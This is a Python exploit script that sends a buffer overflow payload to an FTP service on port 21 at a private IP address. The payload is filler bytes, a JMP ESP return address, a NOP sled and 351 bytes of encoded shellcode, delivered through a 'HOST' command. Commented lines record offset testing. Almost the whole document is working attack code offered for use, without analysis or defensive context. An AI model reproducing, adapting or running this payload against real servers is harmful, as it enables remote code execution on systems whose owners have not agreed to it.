#!/usr/bin/python
#payload script By :Islam Abd El Hakim

import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

shellcode=("\xd9\xc0\xbe\x31\x6b\xe7\x88\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x72\x17\x83\xea\xfc\x03\x43\x78\x05\x7d\x5f\x96\x4b"
"\x7e\x9f\x67\x2c\xf6\x7a\x56\x6c\x6c\x0f\xc9\x5c\xe6\x5d\xe6"
"\x17\xaa\x75\x7d\x55\x63\x7a\x36\xd0\x55\xb5\xc7\x49\xa5\xd4"
"\x4b\x90\xfa\x36\x75\x5b\x0f\x37\xb2\x86\xe2\x65\x6b\xcc\x51"
"\x99\x18\x98\x69\x12\x52\x0c\xea\xc7\x23\x2f\xdb\x56\x3f\x76"
"\xfb\x59\xec\x02\xb2\x41\xf1\x2f\x0c\xfa\xc1\xc4\x8f\x2a\x18"
"\x24\x23\x13\x94\xd7\x3d\x54\x13\x08\x48\xac\x67\xb5\x4b\x6b"
"\x15\x61\xd9\x6f\xbd\xe2\x79\x4b\x3f\x26\x1f\x18\x33\x83\x6b"
"\x46\x50\x12\xbf\xfd\x6c\x9f\x3e\xd1\xe4\xdb\x64\xf5\xad\xb8"
"\x05\xac\x0b\x6e\x39\xae\xf3\xcf\x9f\xa5\x1e\x1b\x92\xe4\x76"
"\xe8\x9f\x16\x87\x66\x97\x65\xb5\x29\x03\xe1\xf5\xa2\x8d\xf6"
"\xfa\x98\x6a\x68\x05\x23\x8b\xa1\xc2\x77\xdb\xd9\xe3\xf7\xb0"
"\x19\x0b\x22\x16\x49\xa3\x9d\xd7\x39\x03\x4e\xb0\x53\x8c\xb1"
"\xa0\x5c\x46\xda\x4b\xa7\x01\xef\x8b\xa5\xde\x87\x89\xa9\xe1"
"\xec\x07\x4f\x8b\x02\x4e\xd8\x24\xba\xcb\x92\xd5\x43\xc6\xdf"
"\xd6\xc8\xe5\x20\x98\x38\x83\x32\x4d\xc9\xde\x68\xd8\xd6\xf4"
"\x04\x86\x45\x93\xd4\xc1\x75\x0c\x83\x86\x48\x45\x41\x3b\xf2"
"\xff\x77\xc6\x62\xc7\x33\x1d\x57\xc6\xba\xd0\xe3\xec\xac\x2c"
"\xeb\xa8\x98\xe0\xba\x66\x76\x47\x15\xc9\x20\x11\xca\x83\xa4"
"\xe4\x20\x14\xb2\xe8\x6c\xe2\x5a\x58\xd9\xb3\x65\x55\x8d\x33"
"\x1e\x8b\x2d\xbb\xf5\x0f\x5d\xf6\x57\x39\xf6\x5f\x02\x7b\x9b"
"\x5f\xf9\xb8\xa2\xe3\x0b\x41\x51\xfb\x7e\x44\x1d\xbb\x93\x34"
"\x0e\x2e\x93\xeb\x2f\x7b") #sheelcode   351 bytes

Evil=247*"A"+"\xC3\x5D\x2B\x75"+5*"\x90"+shellcode                                        

#Evil=247*"A"+"\x89\x5E\x89\x73"+262*"c"
#Evil=247*"A"+"\x89\x5E\x89\x73"+shellcode    #lenth  of tha payload = 518 - 5
                                           #73895E89      JMP ESP

print "\n sending Evil Payload"

s.connect(('192.168.1.3',21))             #connect to the target
data=s.recv(1023)                          # recieve data
s.send('HOST'+Evil+'\r\n')                 #send the request
s.close()   #close connection

